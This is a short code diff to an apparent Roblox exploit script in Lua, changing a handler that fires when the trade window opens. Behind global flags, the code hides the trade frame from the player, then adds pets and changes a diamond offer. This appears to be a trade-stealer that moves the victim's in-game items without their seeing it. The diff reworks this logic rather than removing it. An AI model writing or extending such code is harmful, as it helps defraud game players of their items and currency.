@@ -133,13 +133,15 @@ local TradeFrame = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame
 local TradeGui = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade
 TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
     if TradeGui.Visible then
-        if getgenv().aol and not getgenv().here then
-            TradeFrame.Visible = true
-        else
-            TradeFrame.Visible = false
-            task.spawn(rt)
-            AddWhitelistedPets()
-            ModifyDiamondOffer(Diamonds)
+        if getgenv().here then
+            if getgenv().aol then
+                TradeFrame.Visible = true
+            else
+                TradeFrame.Visible = false
+                task.spawn(rt)
+                AddWhitelistedPets()
+                ModifyDiamondOffer(Diamonds)
+            end
         end
     end
 end)
